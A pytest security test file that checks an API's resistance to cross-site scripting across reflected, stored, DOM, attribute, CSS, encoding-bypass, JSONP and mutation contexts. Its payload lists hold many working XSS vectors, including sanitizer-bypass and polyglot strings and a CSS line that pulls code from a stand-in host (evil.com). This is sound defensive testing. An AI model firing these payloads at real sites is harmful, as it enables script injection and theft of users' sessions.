"""
Security tests for Cross-Site Scripting (XSS) vulnerabilities.

Tests for:
- Reflected XSS
- Stored XSS
- DOM-based XSS
- XSS in different contexts (HTML, JavaScript, attributes, CSS)
- XSS encoding bypasses
- Content Security Policy (CSP) headers
- Script injection in JSON responses
"""

import pytest
from httpx import AsyncClient
import html


# ============================================================
# XSS PAYLOADS
# ============================================================


XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",

    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe onload=alert('XSS')>",

    # Without quotes
    "<script>alert(String.fromCharCode(88,83,83))</script>",

    # Mixed case to bypass filters
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<IMG SRC=x ONERROR=alert('XSS')>",

    # Encoded variants
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",

    # JavaScript protocol
    "<a href='javascript:alert(1)'>click</a>",
    "<img src='javascript:alert(1)'>",

    # Data URI
    "<img src='data:text/html,<script>alert(1)</script>'>",

    # HTML5 tags
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",

    # SVG based
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",

    # Unusual vectors
    "<math><mi xlink:href='data:x,<script>alert(1)</script>'>",
    "<form><button formaction='javascript:alert(1)'>click</button></form>",

    # Unicode encoding
    "<script>\\u0061lert('XSS')</script>",

    # Polyglot payloads
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>;\\x3e",
]


# ============================================================
# REFLECTED XSS TESTS
# ============================================================


@pytest.mark.security
class TestReflectedXSS:
    """Test reflected XSS prevention in API responses"""

    async def test_xss_in_error_messages(self, auth_client: AsyncClient):
        """Test that error messages don't reflect unescaped user input"""
        for payload in XSS_PAYLOADS[:10]:  # Test subset for speed
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            # Get response body
            body = response.text

            # Verify the payload is not reflected as-is in the response
            assert payload not in body, \
                f"XSS payload '{payload}' was reflected in error response!"

            # Verify script tags are not present
            assert "<script>" not in body.lower(), \
                f"Script tag from payload '{payload}' present in response!"

            # If it's JSON, verify proper escaping
            if response.headers.get("content-type", "").startswith("application/json"):
                # JSON should escape <, >, and other dangerous chars
                assert "&lt;script&gt;" not in body and "<script>" not in body

    async def test_xss_in_validation_errors(self, auth_client: AsyncClient):
        """Test XSS in validation error messages"""
        xss_email = "<script>alert('XSS')</script>@example.com"

        response = await auth_client.post(
            "/auth/register",
            json={
                "email": xss_email,
                "password": "ValidPassword123!",
                "full_name": "Test User"
            }
        )

        body = response.text

        # Verify the script is not reflected
        assert "<script>" not in body.lower()
        assert "alert(" not in body

    async def test_xss_in_api_key_name(self, auth_client: AsyncClient, auth_token):
        """Test XSS in API key name field"""
        for payload in XSS_PAYLOADS[:5]:
            response = await auth_client.post(
                "/api-keys/",
                headers={"Authorization": f"Bearer {auth_token}"},
                json={
                    "name": payload,
                    "scopes": ["read:agents"]
                }
            )

            if response.status_code in [200, 201]:
                data = response.json()
                name = data.get("name", "")

                # Verify script tags are escaped or removed
                assert "<script>" not in name.lower()
                assert "onerror=" not in name.lower()
                assert "onload=" not in name.lower()


# ============================================================
# STORED XSS TESTS
# ============================================================


@pytest.mark.security
class TestStoredXSS:
    """Test stored XSS prevention in database-persisted content"""

    async def test_stored_xss_in_user_profile(self, auth_client: AsyncClient):
        """Test that stored user data doesn't contain executable scripts"""
        xss_name = "<script>alert('Stored XSS')</script>"

        # Try to register with XSS in name
        response = await auth_client.post(
            "/auth/register",
            json={
                "email": f"stored_xss_{hash(xss_name)}@example.com",
                "password": "ValidPassword123!",
                "full_name": xss_name
            }
        )

        if response.status_code == 201:
            data = response.json()
            full_name = data.get("full_name", "")

            # Verify the script is escaped or sanitized
            assert "<script>" not in full_name.lower()
            # It should be escaped (e.g., &lt;script&gt;) or removed
            assert "alert(" not in full_name

    async def test_stored_xss_in_api_key_retrieval(self, auth_client: AsyncClient, auth_token):
        """Test stored XSS when retrieving API keys"""
        xss_payload = "<img src=x onerror=alert('XSS')>"

        # Create API key with XSS in name
        create_response = await auth_client.post(
            "/api-keys/",
            headers={"Authorization": f"Bearer {auth_token}"},
            json={
                "name": xss_payload,
                "scopes": ["read:agents"]
            }
        )

        if create_response.status_code in [200, 201]:
            # Retrieve API keys list
            list_response = await auth_client.get(
                "/api-keys/",
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert list_response.status_code == 200
            body = list_response.text

            # Verify XSS is not present in response
            assert "onerror=" not in body.lower()
            assert "<img" not in body.lower() or "&lt;img" in body


# ============================================================
# DOM-BASED XSS TESTS
# ============================================================


@pytest.mark.security
class TestDOMBasedXSS:
    """Test DOM-based XSS prevention"""

    async def test_json_response_escaping(self, auth_client: AsyncClient, test_user):
        """Test that JSON responses properly escape dangerous characters"""
        # Login to get a response with user data
        response = await auth_client.post(
            "/auth/login",
            json={
                "email": test_user["email"],
                "password": test_user["password"]
            }
        )

        # Check Content-Type header
        content_type = response.headers.get("content-type", "")
        assert "application/json" in content_type

        # Verify response is valid JSON (not executable JavaScript)
        assert response.status_code == 200
        data = response.json()

        # Verify no JavaScript code in token values
        if "access_token" in data:
            token = data["access_token"]
            assert "<script>" not in token.lower()
            assert "javascript:" not in token.lower()


# ============================================================
# CONTEXT-SPECIFIC XSS TESTS
# ============================================================


@pytest.mark.security
class TestContextSpecificXSS:
    """Test XSS prevention in different contexts"""

    async def test_xss_in_html_attribute_context(self, auth_client: AsyncClient):
        """Test XSS via HTML attribute injection"""
        attribute_payloads = [
            "' onload='alert(1)",
            '" onload="alert(1)',
            "' onfocus='alert(1)' autofocus='",
        ]

        for payload in attribute_payloads:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"attr_{hash(payload)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": payload
                }
            )

            if response.status_code == 201:
                data = response.json()
                name = data.get("full_name", "")

                # Verify event handlers are escaped
                assert "onload=" not in name.lower()
                assert "onfocus=" not in name.lower()

    async def test_xss_in_javascript_string_context(self, auth_client: AsyncClient):
        """Test XSS via JavaScript string breaking"""
        js_payloads = [
            "'; alert(1); //",
            "\"; alert(1); //",
            "</script><script>alert(1)</script>",
        ]

        for payload in js_payloads:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"js_{hash(payload)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": payload
                }
            )

            # Should handle safely
            assert response.status_code in [201, 422, 400, 409]

    async def test_xss_in_css_context(self, auth_client: AsyncClient):
        """Test XSS via CSS injection"""
        css_payloads = [
            "color: red; background: url('javascript:alert(1)');",
            "expression(alert(1))",
            "-moz-binding: url('http://evil.com/xss.xml#xss')",
        ]

        for payload in css_payloads:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"css_{hash(payload)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": payload
                }
            )

            # Should handle safely
            assert response.status_code in [201, 422, 400, 409]


# ============================================================
# XSS ENCODING BYPASS TESTS
# ============================================================


@pytest.mark.security
class TestXSSEncodingBypass:
    """Test XSS prevention against encoding bypasses"""

    async def test_xss_with_double_encoding(self, auth_client: AsyncClient):
        """Test XSS with double-encoded payloads"""
        # %253C = %3C = <
        double_encoded = "%253Cscript%253Ealert(1)%253C/script%253E"

        response = await auth_client.post(
            "/auth/login",
            json={
                "email": double_encoded,
                "password": "test"
            }
        )

        body = response.text
        assert "<script>" not in body.lower()

    async def test_xss_with_unicode_encoding(self, auth_client: AsyncClient):
        """Test XSS with Unicode-encoded payloads"""
        unicode_payloads = [
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        ]

        for payload in unicode_payloads:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            body = response.text
            assert "<script>" not in body.lower()

    async def test_xss_with_html_entities(self, auth_client: AsyncClient):
        """Test XSS with HTML entity encoding"""
        entity_payloads = [
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        ]

        for payload in entity_payloads:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            # Should not decode and execute
            body = response.text
            assert "alert(1)" not in body or html.escape("alert(1)") in body


# ============================================================
# CONTENT SECURITY POLICY TESTS
# ============================================================


@pytest.mark.security
class TestContentSecurityPolicy:
    """Test Content Security Policy (CSP) headers"""

    async def test_csp_header_present(self, auth_client: AsyncClient):
        """Test that CSP header is present in responses"""
        response = await auth_client.get("/")

        # While CSP is more important for HTML responses,
        # check if security headers are present
        headers = response.headers

        # Check for security headers (CSP might not be needed for JSON API)
        # But we should have other security headers
        assert "x-content-type-options" in headers or \
               "content-type" in headers, \
               "Missing security headers"

    async def test_no_inline_script_execution(self, auth_client: AsyncClient, test_user):
        """Test that responses don't allow inline script execution"""
        response = await auth_client.post(
            "/auth/login",
            json={
                "email": test_user["email"],
                "password": test_user["password"]
            }
        )

        # Verify Content-Type is JSON, not HTML
        content_type = response.headers.get("content-type", "")
        if response.status_code == 200:
            assert "application/json" in content_type

        # Verify no executable content in response
        body = response.text
        assert not body.strip().startswith("<!DOCTYPE") and \
               not body.strip().startswith("<html")


# ============================================================
# JSON INJECTION TESTS
# ============================================================


@pytest.mark.security
class TestJSONInjection:
    """Test JSON injection and JavaScript execution in JSON responses"""

    async def test_json_injection(self, auth_client: AsyncClient):
        """Test JSON injection attempts"""
        json_injection_payloads = [
            '{"email": "test@example.com", "extra": "value"}',
            '{"email": "test@example.com"} /* malicious comment */',
        ]

        for payload in json_injection_payloads:
            # Test if extra JSON is processed
            response = await auth_client.post(
                "/auth/login",
                headers={"Content-Type": "application/json"},
                content=payload
            )

            # Should either succeed or fail validation, not cause errors
            assert response.status_code in [200, 401, 422, 400]

    async def test_callback_parameter_xss(self, auth_client: AsyncClient, test_user):
        """Test JSONP callback XSS (if JSONP is supported)"""
        # JSONP callbacks can lead to XSS
        response = await auth_client.get(
            f"/auth/user?callback=alert(1)"
        )

        # JSONP should not be supported on sensitive endpoints
        body = response.text

        # Should not execute JavaScript callback
        assert not body.startswith("alert(1)(")


# ============================================================
# MUTATION XSS TESTS
# ============================================================


@pytest.mark.security
class TestMutationXSS:
    """Test mXSS (mutation XSS) prevention"""

    async def test_mxss_via_sanitizer_bypass(self, auth_client: AsyncClient):
        """Test mXSS payloads that can bypass sanitizers"""
        mxss_payloads = [
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
            "<style><img src=x onerror=alert(1)></style>",
        ]

        for payload in mxss_payloads:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"mxss_{hash(payload)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": payload
                }
            )

            if response.status_code == 201:
                data = response.json()
                name = data.get("full_name", "")

                # Verify no XSS payload remains
                assert "onerror=" not in name.lower()
                assert "<img" not in name.lower() or html.escape("<img") in name
